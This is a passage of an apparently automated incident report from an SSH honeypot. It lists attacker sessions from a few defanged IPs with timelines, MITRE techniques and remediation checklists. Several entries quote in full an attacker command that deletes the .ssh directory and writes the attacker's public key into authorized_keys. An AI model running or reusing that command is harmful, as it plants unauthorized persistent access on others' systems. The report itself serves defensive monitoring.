- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d469d46d5ad

| Field | Detail |
|---|---|
| **Source IP** | `123.48.142[.]249` |
| **First Seen** | 2026-04-19 10:56 |
| **Last Seen** | 2026-04-19 10:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 10:56:56` | `cowrie.session.connect` |
| `2026-04-19 10:56:56` | `cowrie.client.version` |
| `2026-04-19 10:56:56` | `cowrie.client.kex` |
| `2026-04-19 10:56:57` | `cowrie.login.success` |
| `2026-04-19 10:56:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.48.142[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.48.142[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6506d659743c

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 10:59 |
| **Last Seen** | 2026-04-19 10:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 10:59:37` | `cowrie.session.connect` |
| `2026-04-19 10:59:37` | `cowrie.client.version` |
| `2026-04-19 10:59:37` | `cowrie.client.kex` |
| `2026-04-19 10:59:38` | `cowrie.login.success` |
| `2026-04-19 10:59:38` | `cowrie.session.params` |
| `2026-04-19 10:59:38` | `cowrie.command.input` |
| `2026-04-19 10:59:38` | `cowrie.command.failed` |
| `2026-04-19 10:59:38` | `cowrie.log.closed` |
| `2026-04-19 10:59:38` | `cowrie.session.params` |
| `2026-04-19 10:59:38` | `cowrie.command.input` |
| `2026-04-19 10:59:39` | `cowrie.session.file_download` |
| `2026-04-19 10:59:39` | `cowrie.log.closed` |
| `2026-04-19 10:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49d6d47e2e70

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 10:59 |
| **Last Seen** | 2026-04-19 10:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 10:59:42` | `cowrie.session.connect` |
| `2026-04-19 10:59:42` | `cowrie.client.version` |
| `2026-04-19 10:59:42` | `cowrie.client.kex` |
| `2026-04-19 10:59:43` | `cowrie.login.success` |
| `2026-04-19 10:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b62dd90fba0

| Field | Detail |
|---|---|
| **Source IP** | `123.48.142[.]249` |
| **First Seen** | 2026-04-19 11:00 |
| **Last Seen** | 2026-04-19 11:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:00:19` | `cowrie.session.connect` |
| `2026-04-19 11:00:19` | `cowrie.client.version` |
| `2026-04-19 11:00:19` | `cowrie.client.kex` |
| `2026-04-19 11:00:19` | `cowrie.login.success` |
| `2026-04-19 11:00:20` | `cowrie.session.params` |
| `2026-04-19 11:00:20` | `cowrie.command.input` |
| `2026-04-19 11:00:20` | `cowrie.command.failed` |
| `2026-04-19 11:00:20` | `cowrie.log.closed` |
| `2026-04-19 11:00:20` | `cowrie.session.params` |
| `2026-04-19 11:00:20` | `cowrie.command.input` |
| `2026-04-19 11:00:20` | `cowrie.session.file_download` |
| `2026-04-19 11:00:20` | `cowrie.log.closed` |
| `2026-04-19 11:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.48.142[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.48.142[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa3e53df6a71

| Field | Detail |
|---|---|
| **Source IP** | `123.48.142[.]249` |
| **First Seen** | 2026-04-19 11:00 |
| **Last Seen** | 2026-04-19 11:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:00:22` | `cowrie.session.connect` |
| `2026-04-19 11:00:22` | `cowrie.client.version` |
| `2026-04-19 11:00:23` | `cowrie.client.kex` |
| `2026-04-19 11:00:23` | `cowrie.login.success` |
| `2026-04-19 11:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.48.142[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.48.142[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-095db022fb21

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 11:01 |
| **Last Seen** | 2026-04-19 11:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:01:36` | `cowrie.session.connect` |
| `2026-04-19 11:01:36` | `cowrie.client.version` |
| `2026-04-19 11:01:36` | `cowrie.client.kex` |
| `2026-04-19 11:01:36` | `cowrie.login.success` |
| `2026-04-19 11:01:37` | `cowrie.session.params` |
| `2026-04-19 11:01:37` | `cowrie.command.input` |
| `2026-04-19 11:01:37` | `cowrie.command.failed` |
| `2026-04-19 11:01:37` | `cowrie.log.closed` |
| `2026-04-19 11:01:37` | `cowrie.session.params` |
| `2026-04-19 11:01:37` | `cowrie.command.input` |
| `2026-04-19 11:01:37` | `cowrie.session.file_download` |
| `2026-04-19 11:01:37` | `cowrie.log.closed` |
| `2026-04-19 11:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-225e1f75f778

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 11:01 |
| **Last Seen** | 2026-04-19 11:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:01:40` | `cowrie.session.connect` |
| `2026-04-19 11:01:40` | `cowrie.client.version` |
| `2026-04-19 11:01:40` | `cowrie.client.kex` |
| `2026-04-19 11:01:40` | `cowrie.login.success` |
| `2026-04-19 11:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f5a578a690e

| Field | Detail |
|---|---|
| **Source IP** | `123.48.142[.]249` |
| **First Seen** | 2026-04-19 11:02 |
| **Last Seen** | 2026-04-19 11:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:02:07` | `cowrie.session.connect` |
| `2026-04-19 11:02:07` | `cowrie.client.version` |
| `2026-04-19 11:02:07` | `cowrie.client.kex` |
| `2026-04-19 11:02:08` | `cowrie.login.success` |
| `2026-04-19 11:02:08` | `cowrie.session.params` |
| `2026-04-19 11:02:08` | `cowrie.command.input` |
| `2026-04-19 11:02:08` | `cowrie.command.failed` |
| `2026-04-19 11:02:08` | `cowrie.log.closed` |
| `2026-04-19 11:02:09` | `cowrie.session.params` |
| `2026-04-19 11:02:09` | `cowrie.command.input` |
| `2026-04-19 11:02:09` | `cowrie.session.file_download` |
| `2026-04-19 11:02:09` | `cowrie.log.closed` |
| `2026-04-19 11:02:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.48.142[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.48.142[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a864736c442f

| Field | Detail |
|---|---|
| **Source IP** | `123.48.142[.]249` |
| **First Seen** | 2026-04-19 11:02 |
| **Last Seen** | 2026-04-19 11:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:02:11` | `cowrie.session.connect` |
| `2026-04-19 11:02:11` | `cowrie.client.version` |
| `2026-04-19 11:02:11` | `cowrie.client.kex` |
| `2026-04-19 11:02:12` | `cowrie.login.success` |
| `2026-04-19 11:02:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.48.142[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.48.142[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18948938625d

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 11:05 |
| **Last Seen** | 2026-04-19 11:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:05:45` | `cowrie.session.connect` |
| `2026-04-19 11:05:45` | `cowrie.client.version` |
| `2026-04-19 11:05:45` | `cowrie.client.kex` |
| `2026-04-19 11:05:46` | `cowrie.login.success` |
| `2026-04-19 11:05:46` | `cowrie.session.params` |
| `2026-04-19 11:05:46` | `cowrie.command.input` |
| `2026-04-19 11:05:46` | `cowrie.command.failed` |
| `2026-04-19 11:05:47` | `cowrie.log.closed` |
| `2026-04-19 11:05:47` | `cowrie.session.params` |
| `2026-04-19 11:05:47` | `cowrie.command.input` |
| `2026-04-19 11:05:47` | `cowrie.session.file_download` |
| `2026-04-19 11:05:47` | `cowrie.log.closed` |
| `2026-04-19 11:05:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eb36055f1a2

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 11:05 |
| **Last Seen** | 2026-04-19 11:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:05:51` | `cowrie.session.connect` |
| `2026-04-19 11:05:51` | `cowrie.client.version` |
| `2026-04-19 11:05:51` | `cowrie.client.kex` |
| `2026-04-19 11:05:52` | `cowrie.login.success` |
| `2026-04-19 11:05:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d0f14c35c21

| Field | Detail |
|---|---|
| **Source IP** | `123.48.142[.]249` |
| **First Seen** | 2026-04-19 11:07 |
| **Last Seen** | 2026-04-19 11:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:07:35` | `cowrie.session.connect` |
| `2026-04-19 11:07:35` | `cowrie.client.version` |
| `2026-04-19 11:07:35` | `cowrie.client.kex` |
| `2026-04-19 11:07:36` | `cowrie.login.success` |
| `2026-04-19 11:07:36` | `cowrie.session.params` |
| `2026-04-19 11:07:36` | `cowrie.command.input` |
| `2026-04-19 11:07:36` | `cowrie.command.failed` |
| `2026-04-19 11:07:36` | `cowrie.log.closed` |
| `2026-04-19 11:07:36` | `cowrie.session.params` |
| `2026-04-19 11:07:36` | `cowrie.command.input` |
| `2026-04-19 11:07:37` | `cowrie.session.file_download` |
| `2026-04-19 11:07:37` | `cowrie.log.closed` |
| `2026-04-19 11:07:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.48.142[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.48.142[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80e49039fd00

| Field | Detail |
|---|---|
| **Source IP** | `123.48.142[.]249` |
| **First Seen** | 2026-04-19 11:07 |
| **Last Seen** | 2026-04-19 11:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:07:39` | `cowrie.session.connect` |
| `2026-04-19 11:07:39` | `cowrie.client.version` |
| `2026-04-19 11:07:39` | `cowrie.client.kex` |
| `2026-04-19 11:07:39` | `cowrie.login.success` |
| `2026-04-19 11:07:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.48.142[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.48.142[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78eb9ddc1501

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 11:07 |
| **Last Seen** | 2026-04-19 11:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:07:53` | `cowrie.session.connect` |
| `2026-04-19 11:07:53` | `cowrie.client.version` |
| `2026-04-19 11:07:53` | `cowrie.client.kex` |
| `2026-04-19 11:07:54` | `cowrie.login.success` |
| `2026-04-19 11:07:54` | `cowrie.session.params` |
| `2026-04-19 11:07:54` | `cowrie.command.input` |
| `2026-04-19 11:07:54` | `cowrie.command.failed` |
| `2026-04-19 11:07:54` | `cowrie.log.closed` |
| `2026-04-19 11:07:55` | `cowrie.session.params` |
| `2026-04-19 11:07:55` | `cowrie.command.input` |
| `2026-04-19 11:07:55` | `cowrie.session.file_download` |
| `2026-04-19 11:07:55` | `cowrie.log.closed` |
| `2026-04-19 11:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c141c7e64407

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-04-19 11:07 |
| **Last Seen** | 2026-04-19 11:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:07:59` | `cowrie.session.connect` |
| `2026-04-19 11:07:59` | `cowrie.client.version` |
| `2026-04-19 11:07:59` | `cowrie.client.kex` |
| `2026-04-19 11:08:00` | `cowrie.login.success` |
| `2026-04-19 11:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-443da4438c8b

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-19 11:09 |
| **Last Seen** | 2026-04-19 11:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:09:55` | `cowrie.session.connect` |
| `2026-04-19 11:09:55` | `cowrie.client.version` |
| `2026-04-19 11:09:55` | `cowrie.client.kex` |
| `2026-04-19 11:09:56` | `cowrie.login.success` |
| `2026-04-19 11:09:56` | `cowrie.session.params` |
| `2026-04-19 11:09:56` | `cowrie.command.input` |
| `2026-04-19 11:09:56` | `cowrie.command.failed` |
| `2026-04-19 11:09:56` | `cowrie.log.closed` |
| `2026-04-19 11:09:57` | `cowrie.session.params` |
| `2026-04-19 11:09:57` | `cowrie.command.input` |
| `2026-04-19 11:09:57` | `cowrie.session.file_download` |
| `2026-04-19 11:09:57` | `cowrie.log.closed` |
| `2026-04-19 11:10:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8671902e2912

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-19 11:09 |
| **Last Seen** | 2026-04-19 11:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 11:09:59` | `cowrie.session.connect` |
| `2026-04-19 11:09:59` | `cowrie.client.version` |
| `2026-04-19 11:09:59` | `cowrie.client.kex` |
| `2026-04-19 11:10:00` | `cowrie.login.success` |
| `2026-04-19 11:10:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d474ef5f1dba

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-19 11:13 |
| **Last Seen** | 2026-04-19 11:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
